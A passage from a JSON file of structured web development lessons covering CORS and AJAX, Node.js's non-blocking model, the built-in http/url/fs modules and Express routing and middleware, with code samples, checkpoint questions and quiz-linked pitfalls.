called\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e1\u003c/td\u003e\n\u003ctd\u003eOPENED\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003eopen()\u003c/code\u003e called\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e2\u003c/td\u003e\n\u003ctd\u003eHEADERS_RECEIVED\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003esend()\u003c/code\u003e called; response headers available\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e3\u003c/td\u003e\n\u003ctd\u003eLOADING\u003c/td\u003e\n\u003ctd\u003eResponse body arriving; \u003ccode\u003eresponseText\u003c/code\u003e updating\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e4\u003c/td\u003e\n\u003ctd\u003eDONE\u003c/td\u003e\n\u003ctd\u003eOperation complete\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e"},{"kind":"h2","html":"The preflight request","text":"The preflight request"},{"kind":"p","html":"For non-simple cross-origin requests — those using methods other than GET/POST or custom headers — the browser sends a \u003cstrong\u003epreflight\u003c/strong\u003e first. A preflight is an OPTIONS request to the same URL asking &quot;are you willing to serve this kind of request?&quot;","text":"For non-simple cross-origin requests — those using methods other than GET/POST or custom headers — the browser sends a **preflight** first. A preflight is an OPTIONS request to the same URL asking \"are you willing to serve this kind of request?\""},{"kind":"code","lang":"text","code":"OPTIONS /data HTTP/1.1\nOrigin: http://localhost:3000\nAccess-Control-Request-Method: DELETE"},{"kind":"p","html":"If the server responds with the correct \u003ccode\u003eAccess-Control-Allow-*\u003c/code\u003e headers, the browser proceeds with the actual request. If not, the browser blocks it before the real request ever leaves.","text":"If the server responds with the correct `Access-Control-Allow-*` headers, the browser proceeds with the actual request. If not, the browser blocks it before the real request ever leaves."},{"kind":"mermaid","source":"sequenceDiagram\n    participant B as Browser (ajax.html)\n    participant S as Server (app.js)\n\n    B-\u003e\u003eS: OPTIONS /data\u003cbr/\u003eOrigin: http://localhost:3000\n    S--\u003e\u003eB: 200 OK\u003cbr/\u003eAccess-Control-Allow-Origin: *\u003cbr/\u003eAccess-Control-Allow-Methods: GET, POST\n\n    B-\u003e\u003eS: GET /data\n    S--\u003e\u003eB: 200 OK\u003cbr/\u003eAccess-Control-Allow-Origin: *\u003cbr/\u003e{ \"result\": \"...\" }\n\n    Note over B: Browser exposes response to script"},{"kind":"checkpoint","q":"A browser script on `http://localhost:3000` tries to send a `DELETE` request to `https://api.example.com`. What does the browser do first?","a":"It sends an OPTIONS preflight to `https://api.example.com` to confirm the server permits DELETE from that origin. Only if the server responds with the correct CORS headers does the browser issue the actual DELETE."},{"kind":"h2","html":"withCredentials","text":"withCredentials"},{"kind":"p","html":"To include cookies and authentication headers in a cross-origin request, set the \u003ccode\u003ewithCredentials\u003c/code\u003e flag:","text":"To include cookies and authentication headers in a cross-origin request, set the `withCredentials` flag:"},{"kind":"code","lang":"js","code":"xhttp.withCredentials = true;"},{"kind":"p","html":"The server must then respond with \u003ccode\u003eAccess-Control-Allow-Origin\u003c/code\u003e set to a \u003cem\u003especific\u003c/em\u003e origin (not \u003ccode\u003e*\u003c/code\u003e) and \u003ccode\u003eAccess-Control-Allow-Credentials: true\u003c/code\u003e. Sending credentials to a wildcard origin is blocked by the browser.","text":"The server must then respond with `Access-Control-Allow-Origin` set to a *specific* origin (not `*`) and `Access-Control-Allow-Credentials: true`. Sending credentials to a wildcard origin is blocked by the browser."},{"kind":"h2","html":"GET vs POST","text":"GET vs POST"},{"kind":"p","html":"GET requests can be bookmarked; query parameters sit in the URL. POST requests cannot be bookmarked; the body holds the data. For form-encoded POST bodies, the content type is \u003ccode\u003eapplication/x-www-form-urlencoded\u003c/code\u003e and the server reads data in chunks.","text":"GET requests can be bookmarked; query parameters sit in the URL. POST requests cannot be bookmarked; the body holds the data. For form-encoded POST bodies, the content type is `application/x-www-form-urlencoded` and the server reads data in chunks."},{"kind":"callout","variant":"takeaway","html":"\u003cp\u003eSOP blocks cross-origin reads by default. CORS lets the \u003cem\u003eserver\u003c/em\u003e grant exceptions via response headers. AJAX uses XMLHttpRequest in four steps: create → handler → open → send. The preflight OPTIONS request fires before any non-simple cross-origin request. readyState 4 means DONE — never 5.\u003c/p\u003e","text":"SOP blocks cross-origin reads by default. CORS lets the *server* grant exceptions via response headers. AJAX uses XMLHttpRequest in four steps: create → handler → open → send. The preflight OPTIONS request fires before any non-simple cross-origin request. readyState 4 means DONE — never 5."}]},{"n":20,"id":"nodejs-basics","title":"Node.js and the single-threaded non-blocking model","hook":"One thread, one hundred requests — here's how Node.js pulls it off.","tags":["nodejs","async","non-blocking","V8","server-scripting"],"module":"Node.js and Server-Side Development","source":"Slide 4, Quiz 7","blocks":[{"kind":"h2","html":"The blocking problem","text":"The blocking problem"},{"kind":"p","html":"A PHP server handling 100 concurrent requests creates 100 threads. Node.js handles all 100 with one.","text":"A PHP server handling 100 concurrent requests creates 100 threads. Node.js handles all 100 with one."},{"kind":"p","html":"Each thread consumes memory. At scale, 100 threads means 100 allocations sitting idle, each waiting for a file read or database response. The thread is blocked — it cannot do anything else until the operation completes.","text":"Each thread consumes memory. At scale, 100 threads means 100 allocations sitting idle, each waiting for a file read or database response. The thread is blocked — it cannot do anything else until the operation completes."},{"kind":"p","html":"Node.js avoids this by never waiting. When it delegates a task to the operating system (read a file, query a database), it immediately picks up the next request. When the OS signals completion, a callback fires and the response goes out.","text":"Node.js avoids this by never waiting. When it delegates a task to the operating system (read a file, query a database), it immediately picks up the next request. When the OS signals completion, a callback fires and the response goes out."},{"kind":"h2","html":"The Chrome V8 engine","text":"The Chrome V8 engine"},{"kind":"p","html":"Node.js is an open-source, cross-platform, back-end JavaScript runtime built on the Chrome V8 engine. V8 compiles JavaScript directly to native machine code — this is why Node.js runs JavaScript outside a web browser at competitive speed.","text":"Node.js is an open-source, cross-platform, back-end JavaScript runtime built on the Chrome V8 engine. V8 compiles JavaScript directly to native machine code — this is why Node.js runs JavaScript outside a web browser at competitive speed."},{"kind":"h2","html":"Single-threaded non-blocking execution","text":"Single-threaded non-blocking execution"},{"kind":"p","html":"Node.js runs single-threaded non-blocking. One thread, no waiting. The event loop dispatches work to the OS and processes callbacks as results arrive.","text":"Node.js runs single-threaded non-blocking. One thread, no waiting. The event loop dispatches work to the OS and processes callbacks as results arrive."},{"kind":"p","html":"This makes Node.js memory-efficient. Traditional thread-per-request servers dedicate one thread per concurrent user. Node.js does not — it reuses the same thread for every request.","text":"This makes Node.js memory-efficient. Traditional thread-per-request servers dedicate one thread per concurrent user. Node.js does not — it reuses the same thread for every request."},{"kind":"h2","html":"Restaurant analogy","text":"Restaurant analogy"},{"kind":"p","html":"Slide 4 illustrates three concurrency models with a restaurant:","text":"Slide 4 illustrates three concurrency models with a restaurant:"},{"kind":"mermaid","source":"sequenceDiagram\n    participant W as Waiter (thread)\n    participant T1 as Table 1\n    participant T2 as Table 2\n    participant K as Kitchen\n\n    Note over W,K: Example 1 — single-threaded non-blocking (Node.js)\n    W-\u003e\u003eT1: Takes order\n    W-\u003e\u003eK: Sends order to kitchen\n    W-\u003e\u003eT2: Takes order (does NOT wait)\n    K--\u003e\u003eW: Table 1 meal ready\n    W--\u003e\u003eT1: Delivers meal\n\n    Note over W,K: Example 2 — single-threaded blocking (e.g. naive ASP.NET)\n    W-\u003e\u003eT1: Takes order\n    W-\u003e\u003eK: Sends order, then WAITS\n    K--\u003e\u003eW: Table 1 meal ready\n    W--\u003e\u003eT1: Delivers meal\n    W-\u003e\u003eT2: Only now takes order"},{"kind":"p","html":"\u003cstrong\u003eExample 1 (Node.js model):\u003c/strong\u003e The waiter takes an order at Table 1, hands it to the kitchen, and immediately goes to Table 2. The waiter never idles.","text":"**Example 1 (Node.js model):** The waiter takes an order at Table 1, hands it to the kitchen, and immediately goes to Table 2. The waiter never idles."},{"kind":"p","html":"\u003cstrong\u003eExample 2 (blocking model):\u003c/strong\u003e The waiter takes an order at Table 1, then stands at the kitchen window doing nothing until the meal is ready. Table 2 waits the entire time.","text":"**Example 2 (blocking model):** The waiter takes an order at Table 1, then stands at the kitchen window doing nothing until the meal is ready. Table 2 waits the entire time."},{"kind":"p","html":"\u003cstrong\u003eExample 3 (multi-threaded model):\u003c/strong\u003e Hire 100 waiters — one per table. Each waiter blocks, but there are enough of them for everyone. This is the traditional thread-per-request approach. For 100 concurrent requests, it requires 100 threads.","text":"**Example 3 (multi-threaded model):** Hire 100 waiters — one per table. Each waiter blocks, but there are enough of them for everyone. This is the traditional thread-per-request approach. For 100 concurrent requests, it requires 100 threads."},{"kind":"checkpoint","q":"In the restaurant analogy, Example 1 represents which Node.js execution model?","a":"Single-threaded non-blocking. One waiter (thread) serves multiple tables by delegating to the kitchen (OS) and moving on, never waiting for a result before taking the next request."},{"kind":"checkpoint","q":"Why is the multi-threaded model (Example 3) less memory-efficient than Node.js at scale?","a":"Each thread consumes memory. 100 concurrent requests require 100 threads, all sitting blocked on I/O. Node.js uses one thread for all 100 by not blocking."},{"kind":"h2","html":"Server-side scripting capabilities","text":"Server-side scripting capabilities"},{"kind":"p","html":"A Node.js server can:","text":"A Node.js server can:"},{"kind":"p","html":"\u003cul\u003e\n\u003cli\u003eGenerate dynamic page content\u003c/li\u003e\n\u003cli\u003eCreate, read, write, and delete files on the server\u003c/li\u003e\n\u003cli\u003eCollect form data\u003c/li\u003e\n\u003cli\u003eAdd, delete, and modify data in a database\u003c/li\u003e\n\u003c/ul\u003e","text":"- Generate dynamic page content\n- Create, read, write, and delete files on the server\n- Collect form data\n- Add, delete, and modify data in a database"},{"kind":"h2","html":"Server architecture","text":"Server architecture"},{"kind":"p","html":"The standard architecture runs: client (browser) sends an HTTP request to a Node.js web server, which queries a database server. All three can run on the same machine (localhost) or on separate machines.","text":"The standard architecture runs: client (browser) sends an HTTP request to a Node.js web server, which queries a database server. All three can run on the same machine (localhost) or on separate machines."},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003e&quot;Single-threaded&quot; does not mean slow. One thread handles many concurrent requests precisely because it never blocks on I/O. CPU-bound work (heavy computation) does block the thread — avoid it in the request handler.\u003c/p\u003e","text":"\"Single-threaded\" does not mean slow. One thread handles many concurrent requests precisely because it never blocks on I/O. CPU-bound work (heavy computation) does block the thread — avoid it in the request handler."},{"kind":"callout","variant":"takeaway","html":"\u003cp\u003eNode.js achieves high concurrency by running single-threaded non-blocking: one thread delegates I/O to the OS and processes callbacks as they arrive. This eliminates the per-thread memory overhead of traditional servers and is why Node.js handles 100 concurrent requests with one thread instead of 100.\u003c/p\u003e","text":"Node.js achieves high concurrency by running single-threaded non-blocking: one thread delegates I/O to the OS and processes callbacks as they arrive. This eliminates the per-thread memory overhead of traditional servers and is why Node.js handles 100 concurrent requests with one thread instead of 100."}]},{"n":21,"id":"nodejs-modules","title":"Node.js built-in modules: http, url, fs","hook":"Three modules, one file server — here's how http, url, and fs work together.","tags":["modules","require","http","url","fs","npm"],"module":"Node.js and Server-Side Development","source":"Slide 4, Slide 11, Quiz 7","blocks":[{"kind":"h2","html":"What is a module?","text":"What is a module?"},{"kind":"p","html":"You want your Node.js server to parse a URL and return a file. You need three built-in modules to do it.","text":"You want your Node.js server to parse a URL and return a file. You need three built-in modules to do it."},{"kind":"p","html":"A module is a set of functions you include in your application — like a JavaScript library. Node.js ships with built-in modules you can use immediately. You also write custom modules and install external ones via npm.","text":"A module is a set of functions you include in your application — like a JavaScript library. Node.js ships with built-in modules you can use immediately. You also write custom modules and install external ones via npm."},{"kind":"p","html":"To load any module, use \u003ccode\u003erequire\u003c/code\u003e:","text":"To load any module, use `require`:"},{"kind":"code","lang":"js","code":"// Built-in module\nconst http = require('http');\n\n// Custom module (relative path with ./)\nconst math = require('./math');\n\n// External module (installed via npm)\nconst express = require('express');"},{"kind":"p","html":"Custom modules expose functions using \u003ccode\u003eexports\u003c/code\u003e or \u003ccode\u003emodule.exports\u003c/code\u003e:","text":"Custom modules expose functions using `exports` or `module.exports`:"},{"kind":"code","lang":"js","code":"// math.js\nexports.area = function(r) {\n  return Math.PI * r * r;\n};"},{"kind":"h2","html":"Module overview","text":"Module overview"},{"kind":"table","html":"\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eModule\u003c/th\u003e\n\u003cth\u003eRole\u003c/th\u003e\n\u003cth\u003eKey method\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003ehttp\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eCreate HTTP servers\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003ehttp.createServer(callback).listen(port)\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003eurl\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eParse URL strings into parts\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003eurl.parse(urlString, true)\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003efs\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eRead and write files\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003efs.readFile(path, callback)\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e"},{"kind":"h2","html":"http — create a web server","text":"http — create a web server"},{"kind":"p","html":"\u003ccode\u003ehttp.createServer\u003c/code\u003e accepts a callback with two arguments: \u003ccode\u003ereq\u003c/code\u003e (the incoming request) and \u003ccode\u003eres\u003c/code\u003e (the response you send back).","text":"`http.createServer` accepts a callback with two arguments: `req` (the incoming request) and `res` (the response you send back)."},{"kind":"code","lang":"js","code":"const http = require('http');\n\nhttp.createServer(function(req, res) {\n  res.writeHead(200, { 'Content-Type': 'text/html' });\n  res.write('Hello World');\n  res.end();\n}).listen(8080);"},{"kind":"p","html":"Three response methods:","text":"Three response methods:"},{"kind":"p","html":"\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eres.writeHead(statusCode, headers)\u003c/code\u003e — sets the HTTP status and content-type header\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eres.write(data)\u003c/code\u003e — writes a chunk of response body\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eres.end()\u003c/code\u003e — signals the response is complete; \u003cstrong\u003erequired\u003c/strong\u003e\u003c/li\u003e\n\u003c/ul\u003e","text":"- `res.writeHead(statusCode, headers)` — sets the HTTP status and content-type header\n- `res.write(data)` — writes a chunk of response body\n- `res.end()` — signals the response is complete; **required**"},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003e\u003ccode\u003ereq\u003c/code\u003e is the \u003cstrong\u003eincoming\u003c/strong\u003e request object. \u003ccode\u003eres\u003c/code\u003e is the \u003cstrong\u003eoutgoing\u003c/strong\u003e response object. Writing \u003ccode\u003ereq.writeHead()\u003c/code\u003e or \u003ccode\u003ereq.write()\u003c/code\u003e does nothing — those methods do not exist on the request. Always send data using \u003ccode\u003eres\u003c/code\u003e. (ISAQuiz7 Q4)\u003c/p\u003e","text":"`req` is the **incoming** request object. `res` is the **outgoing** response object. Writing `req.writeHead()` or `req.write()` does nothing — those methods do not exist on the request. Always send data using `res`. (ISAQuiz7 Q4)"},{"kind":"h2","html":"url — parse URL strings","text":"url — parse URL strings"},{"kind":"p","html":"\u003ccode\u003eurl.parse(urlString, true)\u003c/code\u003e breaks a URL string into its components. The second argument \u003ccode\u003etrue\u003c/code\u003e parses the query string into an object.","text":"`url.parse(urlString, true)` breaks a URL string into its components. The second argument `true` parses the query string into an object."},{"kind":"code","lang":"js","code":"const url = require('url');\nconst adr = 'http://localhost:8888/default.htm?name=John&age=23';\nconst q = url.parse(adr, true);\n\nconsole.log(q.host);      // 'localhost:8888'\nconsole.log(q.pathname);  // '/default.htm'\nconsole.log(q.search);    // '?name=John&age=23'\nconsole.log(q.query);     // { name: 'John', age: '23' }\nconsole.log(q.query.name); // 'John'"},{"kind":"checkpoint","q":"Which property of `url.parse()` gives you just the path, without the query string?","a":"`pathname`. For `http://localhost:8000/admin.html?user=123`, `pathname` returns `/admin.html`. `path` returns `/admin.html?user=123` — it includes the query string."},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003e\u003ccode\u003eparsed.path\u003c/code\u003e includes the query string. \u003ccode\u003eparsed.pathname\u003c/code\u003e does not. The exam uses exactly this distinction: ISAQuiz7 Q3 asks what \u003ccode\u003eparsed.pathname\u003c/code\u003e returns for \u003ccode\u003ehttp://localhost:8000/admin.html?user=123\u003c/code\u003e — the correct answer is \u003ccode\u003e/admin.html\u003c/code\u003e, not \u003ccode\u003e/admin.html?user=123\u003c/code\u003e. Selecting \u003ccode\u003eparsed.path\u003c/code\u003e is the common wrong answer.\u003c/p\u003e","text":"`parsed.path` includes the query string. `parsed.pathname` does not. The exam uses exactly this distinction: ISAQuiz7 Q3 asks what `parsed.pathname` returns for `http://localhost:8000/admin.html?user=123` — the correct answer is `/admin.html`, not `/admin.html?user=123`. Selecting `parsed.path` is the common wrong answer."},{"kind":"h2","html":"fs — read files from disk","text":"fs — read files from disk"},{"kind":"p","html":"\u003ccode\u003efs.readFile\u003c/code\u003e reads a file asynchronously. The callback receives an error (if any) and the file data.","text":"`fs.readFile` reads a file asynchronously. The callback receives an error (if any) and the file data."},{"kind":"code","lang":"js","code":"const fs = require('fs');\n\nfs.readFile('index.html', function(err, data) {\n  if (err) {\n    res.writeHead(404, { 'Content-Type': 'text/html' });\n    res.end('404 Not Found');\n    return;\n  }\n  res.writeHead(200, { 'Content-Type': 'text/html' });\n  res.write(data);\n  res.end();\n});"},{"kind":"p","html":"Always check \u003ccode\u003eerr\u003c/code\u003e first. If the file does not exist, send a 404 and stop — \u003ccode\u003ereturn\u003c/code\u003e prevents \u003ccode\u003eres.end()\u003c/code\u003e from being called twice.","text":"Always check `err` first. If the file does not exist, send a 404 and stop — `return` prevents `res.end()` from being called twice."},{"kind":"h2","html":"npm and external modules","text":"npm and external modules"},{"kind":"p","html":"Built-in modules (\u003ccode\u003ehttp\u003c/code\u003e, \u003ccode\u003eurl\u003c/code\u003e, \u003ccode\u003efs\u003c/code\u003e) need no installation. External modules do.","text":"Built-in modules (`http`, `url`, `fs`) need no installation. External modules do."},{"kind":"code","lang":"bash","code":"npm install mysql\nnpm install express\n# shorthand\nnpm i express"},{"kind":"p","html":"\u003ccode\u003enpm init --yes\u003c/code\u003e creates a \u003ccode\u003epackage.json\u003c/code\u003e file that records project metadata and installed module versions. Every project has one.","text":"`npm init --yes` creates a `package.json` file that records project metadata and installed module versions. Every project has one."},{"kind":"code","lang":"js","code":"// External module after npm install\nconst express = require('express');"},{"kind":"p","html":"Environment variables are available through \u003ccode\u003eprocess.env\u003c/code\u003e:","text":"Environment variables are available through `process.env`:"},{"kind":"code","lang":"js","code":"const port = process.env.PORT;  // undefined if not set"},{"kind":"callout","variant":"takeaway","html":"\u003cp\u003eThree built-in modules cover the core of a Node.js file server: \u003ccode\u003ehttp\u003c/code\u003e creates the server, \u003ccode\u003eurl\u003c/code\u003e parses the request URL, and \u003ccode\u003efs\u003c/code\u003e reads the file. Use \u003ccode\u003epathname\u003c/code\u003e (not \u003ccode\u003epath\u003c/code\u003e) to get the route, and always write the response through \u003ccode\u003eres\u003c/code\u003e (not \u003ccode\u003ereq\u003c/code\u003e). External modules like mysql and express require \u003ccode\u003enpm install\u003c/code\u003e first.\u003c/p\u003e","text":"Three built-in modules cover the core of a Node.js file server: `http` creates the server, `url` parses the request URL, and `fs` reads the file. Use `pathname` (not `path`) to get the route, and always write the response through `res` (not `req`). External modules like mysql and express require `npm install` first."}]},{"n":22,"id":"express-framework","title":"Express: Routing, Middleware, and RESTful Endpoints","hook":"Express gives you declarative routing and a middleware pipeline — two things raw Node.js http server forces you to build by hand.","tags":["express","routing","middleware","rest","npm"],"module":"Node.js and Server-Side Development","source":"Slide 8","blocks":[{"kind":"h2","html":"Why Express exists","text":"Why Express exists"},{"kind":"p","html":"Without Express, each route in a raw \u003ccode\u003ehttp\u003c/code\u003e server requires manual string matching against \u003ccode\u003ereq.url\u003c/code\u003e. Express replaces that with declarative routing — one line per endpoint, with the HTTP method baked in.","text":"Without Express, each route in a raw `http` server requires manual string matching against `req.url`. Express replaces that with declarative routing — one line per endpoint, with the HTTP method baked in."},{"kind":"p","html":"Express is an external npm package, not part of Node.js core. Install it with two commands:","text":"Express is an external npm package, not part of Node.js core. Install it with two commands:"},{"kind":"code","lang":"bash","code":"npm init --yes        # creates package.json, tracks dependencies\nnpm install express   # or: npm i express"},{"kind":"p","html":"\u003ccode\u003enpm init --yes\u003c/code\u003e comes first. Running \u003ccode\u003enpm install\u003c/code\u003e without a \u003ccode\u003epackage.json\u003c/code\u003e still works, but you lose dependency tracking.","text":"`npm init --yes` comes first. Running `npm install` without a `package.json` still works, but you lose dependency tracking."},{"kind":"checkpoint","q":"What does `npm init --yes` produce, and why does it matter before installing Express?","a":"It creates `package.json`. Without it, installed packages are not recorded as dependencies and cannot be reproduced with `npm install` in a fresh environment."},{"kind":"h2","html":"Route handlers","text":"Route handlers"},{"kind":"p","html":"An Express route handler binds a URI pattern and an HTTP method to a callback. The callback receives \u003ccode\u003ereq\u003c/code\u003e (incoming request) and \u003ccode\u003eres\u003c/code\u003e (outgoing response).","text":"An Express route handler binds a URI pattern and an HTTP method to a callback. The callback receives `req` (incoming request) and `res` (outgoing response)."},{"kind":"code","lang":"js","code":"const express = require('express');\nconst app = express();\n\napp.get('/api/v1/patients', (req, res) =\u003e {\n    res.json(patients);                      // 200 OK, JSON body\n});\n\napp.get('/api/v1/patients/:id', (req, res) =\u003e {\n    const id = req.params.id;               // extract URL segment\n    res.json(patients[id]);\n});\n\napp.post('/api/v1/patients', (req, res) =\u003e {\n    const data = req.body;                  // parsed JSON from request body\n    // ... save patient\n    res.status(201).json({ message: 'Patient created' });\n});\n\napp.put('/api/v1/patients/:id', (req, res) =\u003e {\n    const id = req.params.id;\n    // replace entire patient record with req.body\n    res.json({ message: 'Patient replaced' });\n});\n\napp.delete('/api/v1/patients/:id', (req, res) =\u003e {\n    const id = req.params.id;\n    // remove patient\n    res.json({ message: 'Patient deleted' });\n});"},{"kind":"p","html":"Each HTTP method maps to a distinct Express method: \u003ccode\u003eapp.get\u003c/code\u003e, \u003ccode\u003eapp.post\u003c/code\u003e, \u003ccode\u003eapp.put\u003c/code\u003e, \u003ccode\u003eapp.delete\u003c/code\u003e. URL segments prefixed with \u003ccode\u003e:\u003c/code\u003e are named parameters, accessible via \u003ccode\u003ereq.params\u003c/code\u003e.","text":"Each HTTP method maps to a distinct Express method: `app.get`, `app.post`, `app.put`, `app.delete`. URL segments prefixed with `:` are named parameters, accessible via `req.params`."},{"kind":"p","html":"RESTful URL conventions from Slide 8:","text":"RESTful URL conventions from Slide 8:"},{"kind":"table","html":"\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eAction\u003c/th\u003e\n\u003cth\u003eMethod\u003c/th\u003e\n\u003cth\u003eURL\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003eList all\u003c/td\u003e\n\u003ctd\u003eGET\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003e/api/v1/patients/\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eGet one\u003c/td\u003e\n\u003ctd\u003eGET\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003e/api/v1/patients/:id\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eCreate\u003c/td\u003e\n\u003ctd\u003ePOST\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003e/api/v1/patients/\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eReplace\u003c/td\u003e\n\u003ctd\u003ePUT\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003e/api/v1/patients/:id\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eDelete\u003c/td\u003e\n\u003ctd\u003eDELETE\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003e/api/v1/patients/:id\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e"},{"kind":"checkpoint","q":"In Express, which method registers a handler for `POST /api/v1/patients`?","a":"`app.post('/api/v1/patients', callback)`."},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003ePUT replaces the entire resource. PATCH updates one property. Do not use them interchangeably. Sending a PUT with only a \u003ccode\u003ename\u003c/code\u003e field will erase every other field on the record — only the supplied fields survive.\u003c/p\u003e","text":"PUT replaces the entire resource. PATCH updates one property. Do not use them interchangeably. Sending a PUT with only a `name` field will erase every other field on the record — only the supplied fields survive."},{"kind":"h2","html":"Middleware","text":"Middleware"},{"kind":"p","html":"Middleware is an Express function in the request pipeline that can read, modify, or short-circuit the request before the route handler. Register middleware with \u003ccode\u003eapp.use()\u003c/code\u003e. Middleware registered before route handlers runs for every request.","text":"Middleware is an Express function in the request pipeline that can read, modify, or short-circuit the request before the route handler. Register middleware with `app.use()`. Middleware registered before route handlers runs for every request."},{"kind":"p","html":"Two middleware registrations almost every Express API needs:","text":"Two middleware registrations almost every Express API needs:"},{"kind":"h3","html":"Body parsing","text":"Body parsing"},{"kind":"code","lang":"js","code":"app.use(express.json());"},{"kind":"p","html":"This parses incoming JSON request bodies and populates \u003ccode\u003ereq.body\u003c/code\u003e. Without it, \u003ccode\u003ereq.body\u003c/code\u003e is \u003ccode\u003eundefined\u003c/code\u003e inside route handlers.","text":"This parses incoming JSON request bodies and populates `req.body`. Without it, `req.body` is `undefined` inside route handlers."},{"kind":"h3","html":"CORS headers","text":"CORS headers"},{"kind":"code","lang":"js","code":"app.use((req, res, next) =\u003e {\n    res.setHeader('Access-Control-Allow-Origin', '*');\n    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');\n    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');\n    next();\n});"},{"kind":"p","html":"\u003ccode\u003enext()\u003c/code\u003e passes control to the next middleware or route handler. A middleware that does not call \u003ccode\u003enext()\u003c/code\u003e (and does not send a response) stalls the request permanently.","text":"`next()` passes control to the next middleware or route handler. A middleware that does not call `next()` (and does not send a response) stalls the request permanently."},{"kind":"p","html":"\u003ccode\u003eAccess-Control-Allow-Headers\u003c/code\u003e is required when the browser&#39;s preflight includes \u003ccode\u003eAccess-Control-Request-Headers\u003c/code\u003e — which it does whenever the request carries \u003ccode\u003eContent-Type: application/json\u003c/code\u003e.","text":"`Access-Control-Allow-Headers` is required when the browser's preflight includes `Access-Control-Request-Headers` — which it does whenever the request carries `Content-Type: application/json`."},{"kind":"h2","html":"Environment variables","text":"Environment variables"},{"kind":"p","html":"The server port should not be hard-coded. \u003ccode\u003eprocess.env.PORT\u003c/code\u003e reads the \u003ccode\u003ePORT\u003c/code\u003e environment variable set by the hosting platform. If not set, its value is \u003ccode\u003eundefined\u003c/code\u003e.","text":"The server port should not be hard-coded. `process.env.PORT` reads the `PORT` environment variable set by the hosting platform. If not set, its value is `undefined`."},{"kind":"code","lang":"js","code":"const PORT = process.env.PORT || 8888;\n\napp.listen(PORT, () =\u003e {\n    console.log(`Server running on port ${PORT}`);\n});"},{"kind":"p","html":"The \u003ccode\u003e|| 8888\u003c/code\u003e fallback means local development uses port 8888 when \u003ccode\u003ePORT\u003c/code\u003e is not set in the environment.","text":"The `|| 8888` fallback means local development uses port 8888 when `PORT` is not set in the environment."},{"kind":"callout","variant":"takeaway","html":"\u003cp\u003eExpress adds declarative routing (one method call per endpoint), a composable middleware pipeline, and a clean JSON API surface over raw Node.js. The three setup steps that must happen in order: \u003ccode\u003enpm init --yes\u003c/code\u003e, \u003ccode\u003enpm install express\u003c/code\u003e, then register middleware with \u003ccode\u003eapp.use()\u003c/code\u003e before route handlers. GET returns existing resources; POST creates new ones; PUT replaces entire resources; DELETE removes them.\u003c/p\u003e","text":"Express adds declarative routing (one method call per endpoint), a composable middleware pipeline, and a clean JSON API surface over raw Node.js. The three setup steps that must happen in order: `npm init --yes`, `npm install express`, then register middleware with `app.use()` before route handlers. GET returns existing resources; POST creates new ones; PUT replaces entire resources; DELETE removes them."}]},{"n":23,"id":"db-relational-design","title":"Relational DB design: keys, relationships, and normalization","hook":"Two tables beat one bloated spreadsheet — here is why and how.","tags":["MySQL","primary-key","foreign-key","1NF","2NF","referential-integrity","1:M","M:M"],"module":"Databases and CRUD","source":"Slide 7, Slide 10, Quiz 10","blocks":[{"kind":"h2","html":"The problem with one table","text":"The problem with one table"},{"kind":"p","html":"Imagine a clinic tracking patient visits in a single spreadsheet: \u003ccode\u003epatientid | name | visitDate1 | visitDate2 | visitDate3\u003c/code\u003e. Each new visit forces a new column — or worse, comma-separated dates stuffed into one cell. That cell holds multiple values, which breaks first normal form (1NF): every column must hold one atomic value per row. The fix is to split the data across two tables.","text":"Imagine a clinic tracking patient visits in a single spreadsheet: `patientid | name | visitDate1 | visitDate2 | visitDate3`. Each new visit forces a new column — or worse, comma-separated dates stuffed into one cell. That cell holds multiple values, which breaks first normal form (1NF): every column must hold one atomic value per row. The fix is to split the data across two tables."},{"kind":"h2","html":"Primary key and foreign 